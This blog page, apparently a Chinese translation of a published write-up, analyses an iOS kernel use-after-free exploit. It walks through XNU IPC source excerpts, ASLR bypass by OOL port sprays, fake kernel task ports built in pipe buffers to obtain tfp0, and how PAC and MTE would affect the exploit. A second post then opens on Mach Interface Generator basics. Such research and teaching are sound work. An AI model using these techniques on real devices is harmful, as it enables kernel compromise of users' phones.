<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span> <span class="title function_">ipc_right_copyin</span><span class="params">(<span class="type">ipc_space_t</span> space, <span class="type">mach_port_name_t</span> name,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_entry_t</span> entry,</span></span><br><span class="line"><span class="params">                               <span class="type">mach_msg_type_name_t</span> msgt_name, <span class="type">boolean_t</span> deadok,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_object_t</span> *objectp, <span class="type">ipc_port_t</span> *sorightp,</span></span><br><span class="line"><span class="params">                               <span class="type">ipc_port_t</span> *releasep, <span class="type">int</span> *assertcntp)</span> &#123;</span><br><span class="line">  <span class="type">ipc_entry_bits_t</span> bits;</span><br><span class="line">  <span class="type">ipc_port_t</span> port;</span><br><span class="line"></span><br><span class="line">  *releasep = IP_NULL;</span><br><span class="line">  *assertcntp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  bits = entry-&gt;ie_bits;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (msgt_name) &#123;</span><br><span class="line">    <span class="keyword">case</span> MACH_MSG_TYPE_COPY_SEND: &#123;</span><br><span class="line">      <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_DEAD_NAME) <span class="keyword">goto</span> copy_dead;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* allow for dead send-once rights */</span></span><br><span class="line">      <span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_SEND_RIGHTS) == <span class="number">0</span>) <span class="keyword">goto</span> invalid_right;</span><br><span class="line"></span><br><span class="line">      port = (<span class="type">ipc_port_t</span>)entry-&gt;ie_object;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_SEND) == <span class="number">0</span>) &#123;</span><br><span class="line">        assert(IE_BITS_TYPE(bits) == MACH_PORT_TYPE_SEND_ONCE);</span><br><span class="line">        assert(port-&gt;ip_sorights &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        ip_unlock(port);</span><br><span class="line">        <span class="keyword">goto</span> invalid_right;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      port-&gt;ip_srights++;</span><br><span class="line">      ip_reference(port);</span><br><span class="line">      ip_unlock(port);</span><br><span class="line"></span><br><span class="line">      *objectp = (<span class="type">ipc_object_t</span>)port;</span><br><span class="line">      *sorightp = IP_NULL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    invalid_right:</span><br><span class="line">      <span class="keyword">return</span> KERN_INVALID_RIGHT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IPC条目中的<code>ie_bits</code>是用来检查我们的权限的。如果我们想利用这条消息中的发送权限，我们可以将权限复制到消息中，这段代码在更新相关的引用计数之前，先检查我们在<code>ie_bits</code>中是否有权限，最后让我们访问可以<code>enqueue</code>消息的端口对象。如果我们没有根据<code>entry-&gt;ie_bits</code>的权限，那么发送消息的尝试就会失败。</p>
<p>现在我们的消息已经被复制、验证并更新为包含真正的内核对象指针，<code>ipc_kmsg_send</code>继续前进并将我们的消息添加到目标队列中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">ipc_kmsg_send</span><span class="params">(<span class="type">ipc_kmsg_t</span> kmsg, <span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">                                <span class="type">mach_msg_timeout_t</span> send_timeout)</span> &#123;</span><br><span class="line">  <span class="type">ipc_port_t</span> port;</span><br><span class="line">  <span class="type">thread_t</span> th = current_thread();</span><br><span class="line">  <span class="type">mach_msg_return_t</span> error = MACH_MSG_SUCCESS;</span><br><span class="line">  <span class="type">boolean_t</span> kernel_reply = FALSE;</span><br><span class="line"></span><br><span class="line">  port = (<span class="type">ipc_port_t</span>)kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">  assert(IP_VALID(port));</span><br><span class="line">  ip_lock(port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (port-&gt;ip_receiver == ipc_space_kernel) &#123;</span><br><span class="line">    port-&gt;ip_messages.imq_seqno++;</span><br><span class="line">    ip_unlock(port);</span><br><span class="line"></span><br><span class="line">    kmsg = ipc_kobject_server(kmsg, option);</span><br><span class="line">    <span class="keyword">if</span> (kmsg == IKM_NULL) <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restart the KMSG_INFO tracing for the reply message */</span></span><br><span class="line">    port = (<span class="type">ipc_port_t</span>)kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">    assert(IP_VALID(port));</span><br><span class="line">    ip_lock(port);</span><br><span class="line">    <span class="comment">/* fall thru with reply - same options */</span></span><br><span class="line">    kernel_reply = TRUE;</span><br><span class="line">    <span class="keyword">if</span> (!ip_active(port)) error = MACH_SEND_INVALID_DEST;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (error != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    ip_unlock(port);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    error = ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面可以看出，如果目的端口的<code>ip_receiver</code>是内核IPC空间，<code>ipc_kobject_server</code>作为特例被调用来处理内核消息。内核任务端口的<code>ip_receiver</code>是内核IPC空间，所以我们在安排tfp0的时候一定要复制。</p>
<p>我们要在IPC空间中添加一个IPC条目，<code>ie_object</code>指向内核任务端口，<code>ie_bits</code>表示我们有一个发送权。下面是它的样子：</p>
<p><img src="https://1.bp.blogspot.com/-kUj5tXrfmhc/Xe_gowmkyNI/AAAAAAAAOqc/H4UhPcVZkuopQbU03xGOimtMmOZCVLLRgCEwYBhgL/s640/2-2.png" alt="img"></p>
<h2 id="绕过ASLR并伪造数据结构"><a href="#绕过ASLR并伪造数据结构" class="headerlink" title="绕过ASLR并伪造数据结构"></a>绕过ASLR并伪造数据结构</h2><p>IPC系统一般都需要一种方法来序列化文件描述符，并通过管道发送，内核需要理解这种约定来进行适当的核算。Mach也不例外。Mach端口和文件描述符一样，可以由一个进程向另一个进程发送，并附加发送权限。你可以使用一个包含<code>mach_msg_ool_descriptor_t</code>的特殊消息，从一个进程向另一个进程发送一个<strong>行外</strong>端口。如果你想在一个消息中发送多个端口，你可以发送 <code>mach_msg_ool_ports_descriptor_t</code>，这是一个存储在行外（OOL）的端口数组，意思是在消息头本身之外。</p>
<p>我们和其他许多人一样，将在我们的开发中使用OOL端口描述符。</p>
<p>OOL端口数组之所以如此有用，是因为你可以完全控制数组的大小。当你传入一个由mach端口名组成的数组时，内核将为任意数量的指针分配空间，每一个指针都充满了指向我们要发送的<code>ipc_port</code>结构的指针。如果你没有注意到，我们可以使用这个技巧作为ASLR的旁路，因为我们可以将一个端口指针的OOL描述符数组与释放的大小为192的缓冲区重叠，然后简单地通过<code>getockopt</code>从释放的结构中读取两个相邻的int字段。这时我们就可以开始用我们的任意读取遍历内核数据结构了。</p>
<p>很多利用都会把一个bug变成一个读原语。我们有一个罕见的特权，那就是在进行任何破坏之前就有一个可靠的读原语，所以我们利用这一点结合这个指针披露来泄露所有相关的指针来完成利用，包括在一个已知地址上设置手工数据。我们现在就去做所有必要的遍历，你可以在下面看到。</p>
<p><img src="https://1.bp.blogspot.com/-4waCxHiWNR0/Xe_go0-6CYI/AAAAAAAAOqU/Ziz8NkBkqasC61FGcv4KM75K618GWow0QCEwYBhgL/s640/3-3.png" alt="img"></p>
<p>上面绿色的节点代表我们探索的种子值，橙色的节点代表我们要找的值。通过在消息中喷出一个包含指向代表我们主机端口的<code>ipc_port</code>结构的指针的OOL端口描述符数组，我们找到它的<code>ipc_port</code>，它将通过接收器字段给我们提供<code>ipc_space_kernel</code>。</p>
<p>我们重复同样的初始技巧，为我们自己的任务找到<code>ipc_port</code>。从那里我们找到我们的任务的文件描述符表，然后用它来找到一个用于<code>socket</code>选项和管道缓冲区的<code>vtable</code>。<code>vtable</code>将给我们提供进入内核缓存二进制的指针。因为内核进程的BSD表示<code>kernproc</code>是在<code>bsd/kern/bsd_init.c</code>中全局分配的，所以我们可以使用<code>socketops</code>表中的已知偏移量来找到它，并查找<code>kernel_task</code>的地址。</p>
<p>管道缓冲区是通过调用pipe()系统调用创建的，它分配了一个缓冲区，<strong>我们可以通过文件描述符来写入和读取，这是一个众所周知的技巧，用于在已知地址下获取已知数据</strong>。为了制作我们将注入IPC空间的假<code>ipc_port</code>，我们创建一个管道，并向它发送数据。管道将排队的数据存储到内核堆上的一个缓冲区，通过通用的基于大小的区域分配。我们可以通过对相关管道文件描述符的读写，从用户空间反复读写该缓冲区，而这些数据则存储在内核内存中。通过知道我们管道的缓冲区地址，我们就可以在那里存储受控数据，并为其创建指针。我们将需要这些来为内核任务制作一个制作的<code>ipc_port</code>。</p>
<p>所以我们现在可以创建一个假的<code>ipc_port</code>并把它指向<code>kernel_task</code>和<code>ipc_space_kernel</code>， 对吗？我现在应该指出，即使我们可以调用<code>task_for_pid(0)</code>并获得一个<code>kernel_task</code>端口，我们也不能向它发送消息。当内核将一个任务的 <code>ipc_port</code>转化为任务结构时，任何试图向<code>kernel_task</code>发送消息的用户区任务都会被阻止。这在<code>task_conversion_eval</code>中实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_conversion_eval</span><span class="params">(<span class="type">task_t</span> caller, <span class="type">task_t</span> victim)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Tasks are allowed to resolve their own task ports, and the kernel is</span></span><br><span class="line"><span class="comment">         * allowed to resolve anyone&#x27;s task port.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (caller == kernel_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (caller == victim) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Only the kernel can can resolve the kernel&#x27;s task port. We&#x27;ve established</span></span><br><span class="line"><span class="comment">         * by this point that the caller is not kernel_task.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (victim == TASK_NULL || victim == kernel_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>我使用了很多人使用过的<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html">技巧</a>，简单地创建了一个<code>kernel_task</code>对象的副本，这样他们使用的指针比较就不会检测到我在向假的<code>kernel_task</code>对象发送消息。它不是真正的<code>kernel_task</code>并不重要，因为用一个假的<code>kernel_task</code>来支持<code>mach_vm_*</code>函数是很简单的，我们只需要复制内核的<code>kernel_map</code>和初始化一些其他的字段。在上图中你可以看到，我们可以简单地从<code>kernel_task</code>中提取，我们已经知道它的地址。我们将在管道缓冲区中存储与假<code>ipc_port</code>相邻的假内核任务。</p>
<h2 id="注入kernel-task端口"><a href="#注入kernel-task端口" class="headerlink" title="注入kernel_task端口"></a>注入kernel_task端口</h2><p>我们现在要使用OOL端口描述符数组做另一个用途。我们向自己发送一条消息，其中包含一个OOL数组，该数组包含我们的任务端口名称的副本，我们有发送权。发送权的验证最初发生在消息被发送的时候，所以如果我们在等待发送的时候编辑数组，我们可以覆盖其中一个<code>ipc_ports</code>，指向我们的假的<code>kernel_task ipc_port</code>。这个技巧改编自Stefan Esser关于这个主题的出色<a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">演讲</a>，并且已经被用于一些漏洞的利用。请注意，<code>ipc_port</code>本身并没有发送或接收权限的概念；这些权限是作为<code>ipc_entry</code>的一部分被跟踪的，并且在<code>ipc_port</code>之外被处理。这是有道理的，因为一个端口封装了一个给定的消息队列。向该队列发送或接收的权限是每个进程所特有的，因此我们可以看到为什么这些信息会独立地存储在每个进程的表中。</p>
<p>尽管这种在OOL端口描述符数组中覆盖指针的技巧是一种已知的利用技术，但如何真正使这种破坏发生，要由利用开发者来想办法。我们有一个任意读取和任意释放。OOL端口描述符数组和管道缓冲区是在全局区外分配的。前面我们记下了管道缓冲区的地址。所以我们只需要释放管道缓冲区的实际缓冲区地址，并喷涂OOL端口描述符数组。然后我们读取管道缓冲区寻找我们任务的<code>ipc_port</code>，用我们的假端口指针覆盖它。然后我们将消息传递给自己，并检查我们是否成功注入了假的内核任务端口。</p>
<p>此时，我们有了tfp0。就像<code>voucher_swap</code>和其他漏洞一样，我们要使用这个临时的tfp0使用管道缓冲结构来引导一个更稳定的tfp0。我们通过使用内核任务端口来分配一页专门用于存储我们的数据的内核内存，然后使用写原语将我们的假任务端口和<code>kernel_task</code>写入那里。然后我们改变我们的IPC空间条目，使之指向这个新的<code>ipc_port</code>。</p>
<p>我们仍然有一个管道结构，它有一个指向释放的缓冲区的悬空指针。我们不想让它在关闭fd时double-free，所以我们使用新的稳定的tfp0来清空这个指针。我们基本上做了两个动作来破坏内存：释放那个指针，并使用新的使用后释放的管道缓冲区来覆盖单个<code>ipc_port</code>指针，所以跟踪清理是相当直接的。</p>
<h2 id="评估PAC和MTE"><a href="#评估PAC和MTE" class="headerlink" title="评估PAC和MTE"></a>评估PAC和MTE</h2><p>因为这个漏洞是基于内存损坏的bug，所以不同的缓解措施对它的影响是一个挥之不去的问题。通过A12芯片，苹果为iOS带来了PAC(指针认证)，这似乎是为了限制内核代码的执行，假设任意的内核读写等目标。这听起来是一个很强的缓解措施，如果没有实际经验，我不知道利用情况如何。我是在A9芯片上测试的，所以我只是希望我的利用中不会做任何会被PAC缓解的事情。事实果然如此。因为我的漏洞只针对数据结构，不涉及任意代码执行，所以没有代码指针可以伪造。</p>
<p>iOS 13开始引入了对一些数据指针的保护，所以值得研究一下我需要伪造哪些指针才能让这个漏洞在数据PAC的情况下发挥作用。PAC通过用私钥和指针本身在栈上的位置作为上下文值进行签名来保护栈上的返回地址不被破坏。但是，其他代码指针的签名是没有上下文值的。同样，数据PAC的有效性很可能取决于苹果选择如何使用上下文值。</p>
<p>让我们考虑一下这样的情况：所有的数据指针都是受保护的，但没有基于位置的上下文签名。在这种情况下，只要我们设法泄露它们，我们就可以将它们从一个位置复制到另一个位置。这就是比较有名的 “指针替换攻击”，Brandon在他关于PAC的<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">博文</a>中已经描述过。</p>
<p>我们的读原语在数据PAC的上下文中仍然有效，因为我们的悬空指针仍然是签名的。我们最终需要伪造或替换几个攻击者来源的指针：<code>ipc_space_kernel</code>、<code>kernel_map</code>、<code>&amp;fake_port</code>和<code>&amp;fake_task</code>，以及找到它们所需的所有中间读。回顾一下，<code>&amp;fake_port</code>和<code>&amp;fake_task</code>是指向管道缓冲区的指针。对于我们的初始入口点，<code>pktoininfo</code>指针是否受保护并不重要，因为我们必须通过OOL端口喷涂来泄露一个真正的<code>ipc_port</code>指针。这意味着我们可以收集一个签名的<code>ipc_port</code>，然后做所有我们已经做的前期数据结构遍历，复制PAC数据指针没有问题，<code>ipc_space_kernel</code>和<code>kernel_map</code>已经被签名了，如果管道缓冲区被签名了，我们可以简单地将假的端口和任务分割到两个管道缓冲区，然后获得每个缓冲区的签名指针。在任何情况下，这个漏洞都不会完全开箱即用，因为我们确实伪造了一个指针到文件描述符表中去查找任意的fd结构，而且有些查找可能需要读取超过20字节的数据。不过，我相信读取原语的功能足够强大，可以在不费吹灰之力的情况下解决这些漏洞。</p>
<p>实际上iOS 13只保护一些数据指针，矛盾的是这可能会提高终端用户的安全性。例如，如果管道缓冲区不受保护，如果端口的指针是有签名的，那么简单地泄露一个缓冲区的地址不太可能让我们用这个指针来表示一个假的ipc_port。对17B5068e的内核缓存进行检查后发现，IPC端口指针确实没有受到保护，但根据苹果今年早些时候的BlackHat演讲，我认为他们计划这样做（或者已经在非beta构建中这样做了）。就像任何缓解措施与提供强大初始原语的bug相结合一样，这只是一个设计替代利用技术的问题。在不考虑哪些指针应该被保护或不保护的捶胸顿足的情况下，我希望在未来，尽可能多的指针都以位置作为上下文进行签名，以帮助缓解指针替换攻击的影响。从我们的思想实验中可以看出，如果数据指针只是简单地以上下文为0进行签名，那么，一个好的基于use-after-free的读取原语并没有什么好处。</p>
<p>另一个需要考虑的缓解措施是ARM的内存标签扩展（MTE），我相信苹果会尝试实现这个即将到来的CPU功能。对于这个缓解措施，这里和这里有一个很好的高层总结。实质上，内存分配器将为内存分配分配分配一个随机的标签，这个标签将成为指针上部未使用位的一部分，就像在PAC中一样。正确的标签值将被存储在行外，类似于ASAN如何将堆元数据存储在行外。当处理器去解除对指针的引用时，它会检查标签是否匹配。这个漏洞本来是可以被MTE缓解的，因为我们在漏洞中多次触发释放后的使用，每次访问释放的指针时，它的标签都会与释放范围的新标签或哪个分配回收缓冲区的标签进行比较。根据CPU或内核的配置，当一个不匹配的标签被识别出来时，会影响到如何进行利用。我希望苹果公司在标签检查失败时配置一个同步或异步异常，考虑到他们根据他们对PAC的LLVM文档，努力触发PAC违规的数据中止。”虽然ARMv8.3的aut*指令本身并不会在失败时触发异常，但编译器只会在会触发异常的序列中发出这些指令。”</p>
<h1 id="iOS-Exploit-Meta"><a href="#iOS-Exploit-Meta" class="headerlink" title="iOS Exploit Meta"></a>iOS Exploit Meta</h1><table>
<thead>
<tr>
<th><strong>Summary</strong></th>
<th><strong>Benefit</strong></th>
<th><strong>Used?</strong></th>
</tr>
</thead>
<tbody><tr>
<td>IOSurface subsystem</td>
<td>Spray arbitrary data of controlled contents and size in kernel address space</td>
<td>Yes</td>
</tr>
<tr>
<td>OOL port descriptor array</td>
<td>Spray arbitrary multiple of 8 array containing pointers to ipc_ports with send right</td>
<td>Yes</td>
</tr>
<tr>
<td>Pipe buffers</td>
<td>Repeatable read&#x2F;write from userland of malloced buffer without needing sprays</td>
<td>Yes</td>
</tr>
<tr>
<td>Looking around the host port for other early ports</td>
<td>Find the kernel task port</td>
<td>Yes, SockPuppetV1, replaced with my own variant later</td>
</tr>
<tr>
<td>Copying kernel_task task port to a new address</td>
<td>Bypass kernel_task task port check for messages coming from a user task</td>
<td>Yes</td>
</tr>
<tr>
<td>Creating a fake task port pointing to an arbitrary “task” and reading its PID</td>
<td>Repeatable arbitrary read</td>
<td>No, already had arbitrary read directly via first stage</td>
</tr>
<tr>
<td>Triggering zone allocator garbage collection</td>
<td>Reclaim an object from one zone with an object from another</td>
<td>No, all relevant objects were already in the generic size-based zones</td>
</tr>
</tbody></table>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-26T09:54:43.000Z" title="2022/3/26 17:54:43">2022-03-26</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-27T09:18:25.349Z" title="2022/3/27 17:18:25">2022-03-27</time></span><span class="level-item">31 minutes read (About 4705 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/26/9.6MIG%E5%8E%9F%E7%90%86/">MIG</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在看XNU内核相关的漏洞，遇到了MIG生成器，虽然漏洞分析文章也讲了一些，但感觉还是有必要系统的学习记录一下。内容参考OS Internals一书。</p>
<h1 id="0x1-MIG"><a href="#0x1-MIG" class="headerlink" title="0x1 MIG"></a>0x1 MIG</h1><p>Mach Interface Generator（MIG）是一个工具，作用是按照<code>.defs</code>文件中的定义为Mach IPC生成RPC代码。<code>.defs</code>文件包含消息传递和过程接口调用规范，能够为消息的发送接收处理自动生成代码，降低了编程错误的可能性。</p>
<p>MIG在语法上类似于Pascal，生成C语言代码，MIG不会对程序员隐藏底层IPC。</p>
<h2 id="1-1-规范文件"><a href="#1-1-规范文件" class="headerlink" title="1.1 规范文件"></a>1.1 规范文件</h2><p>文件通常以后缀<code>.defs</code>结尾，MIG解析<code>.defs</code>文件后，主要生成以下三个文件：</p>
<ul>
<li>客户端代码包含的头文件</li>
<li>与客户端代码链接的用户界面模块，包含向服务器请求消息和接收回复的功能</li>
<li>与服务端代码链接的服务器接口模块，包含用于接收来自客户端的请求、用于根据请求消息的内容调用适当的服务器函数（程序员提供），以及用于发送回复消息的功能。</li>
</ul>
<p>MIG文件包含以下类型，并不是强制性的：</p>
<ul>
<li>Subsystem identifier（子系统标识符）</li>
<li>Serverdemux declaration（Server解复用声明）</li>
<li>Type specifications（Type规格）</li>
<li>Import declarations（导入声明）</li>
<li>Operation descriptions（操作描述）</li>
<li>Options declarations（选项声明）</li>
</ul>
<h3 id="1-1-1-Subsystem"><a href="#1-1-1-Subsystem" class="headerlink" title="1.1.1 Subsystem"></a>1.1.1 Subsystem</h3><p>子系统是客户端、客户端调用的服务器以及服务器导出的操作集的统称，subsystem关键字命名了文件所指定的MIG子系统。MIG在其生成的代码文件的名称中使用这个标识符作为前缀。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subsystem   system-name   message-base-id;</span><br></pre></td></tr></table></figure>

<p>subsystem关键字后面是被定义的子系统的ASCII名称（例如，foo）。 message-base-id是整数基值，用作规范文件中第一个操作的IPC消息标识（消息头中的msgh_id字段）。换句话说，这个值是操作顺序编号的基数。message-base-id可以任意选择。然而，如果同一个程序为多个接口服务，那么每个接口必须有一个唯一的标识符，这样服务器就可以明确地确定所调用的操作。</p>
<p>当MIG创建一个与请求信息相对应的回复信息时，回复标识符通常是请求标识符和数字100的总和。</p>
<h3 id="1-1-2-Serverdemux"><a href="#1-1-2-Serverdemux" class="headerlink" title="1.1.2 Serverdemux"></a>1.1.2 Serverdemux</h3><p><code>serverdemux</code>声明部分可以用来为<code>server-interface</code>模块中的<code>server demultiplexing routine</code>（服务器解复用例程）指定一个替代名称。解复用例程检查请求消息，根据消息头中的<code>msgh_id</code>值，调用适当的子系统例程。如果该值超出了子系统的范围，解复用例程会返回一个错误。该例程的默认名称是<code>&lt;system-name&gt;_server</code>，其中<code>&lt;system-name&gt;</code>是通过子系统语句指定的名称。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serverdemux   somethingelse_server;</span><br></pre></td></tr></table></figure>

<h3 id="1-1-3-Type-specifications"><a href="#1-1-3-Type-specifications" class="headerlink" title="1.1.3 Type specifications"></a>1.1.3 Type specifications</h3><p>类型规范用于定义与用户界面模块输出的函数调用的参数相对应的数据类型。MIG支持诸如简单、结构化、指针和多态等类型的声明。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * Simple Types  </span></span><br><span class="line"><span class="comment"> * type type-name = type-description;  </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line">type <span class="type">int</span> = MACH_MSG_TYPE_INTEGER_32; </span><br><span class="line">type <span class="type">kern_return_t</span> = <span class="type">int</span>; </span><br><span class="line">type some_string = (MACH_MSG_TYPE_STRING, <span class="number">8</span>*<span class="number">128</span>); </span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * Structured and Pointer Types  </span></span><br><span class="line"><span class="comment"> * type type-name = array [size] of type-description;  </span></span><br><span class="line"><span class="comment"> * type type-name = array [*:maxsize] of type-description;  </span></span><br><span class="line"><span class="comment"> * struct [size] of type-description;  </span></span><br><span class="line"><span class="comment"> * type type-name = ^ type-description;  </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line">type thread_ids = <span class="built_in">array</span>[<span class="number">16</span>] of MACH_MSG_TYPE_INTEGER_32; </span><br><span class="line">type a_structure = <span class="keyword">struct</span>[<span class="number">16</span>] of <span class="built_in">array</span>[<span class="number">8</span>] of <span class="type">int</span>; </span><br><span class="line">type ool_array = ^ <span class="built_in">array</span>[] of MACH_MSG_TYPE_INTEGER_32; </span><br><span class="line">type intptr = ^ MACH_MSG_TYPE_INTEGER_32; </span><br><span class="line">type input_string = <span class="built_in">array</span>[*:<span class="number">64</span>] of <span class="type">char</span>;</span><br></pre></td></tr></table></figure>

<p>多态类型用于指定一个参数，该参数的确切类型在运行时才会确定。MIG自动化包括一个额外的参数来适应这种情况。考虑一下下面这种情况。</p>
<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* foo.defs */ </span><br><span class="line">subsystem foo <span class="number">500</span> </span><br><span class="line">#include &lt;mach/std_types.defs&gt; </span><br><span class="line">#include &lt;mach/mach_types.defs&gt; </span><br><span class="line"><span class="keyword">type</span> my_poly_t = polymorphic; </span><br><span class="line">routine foo_func(</span><br><span class="line">	server : mach_port_t; </span><br><span class="line">	arg : my_poly_t</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>MIG生成的<code>foo_func()</code>的代码有如下原型。</p>
<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kern_return_t foo_func( mach_port_t server, my_poly_t arg, mach_msg_type_name_t argPoly);</span><br></pre></td></tr></table></figure>

<p>一个类型声明可以选择性地包含指定翻译或取消分配类型的程序的信息。翻译允许一个类型被用户和服务器界面模块以不同的方式看到。取消分配规范允许指定一个析构函数。</p>
<h3 id="1-1-4-Import-declarations"><a href="#1-1-4-Import-declarations" class="headerlink" title="1.1.4 Import declarations"></a>1.1.4 Import declarations</h3><p>导入声明是用来在MIG生成的模块中包含头文件的。MIG可以被指示在用户和服务器界面模块中都包含这样的头文件，也可以只在这两个模块中包含一个。</p>
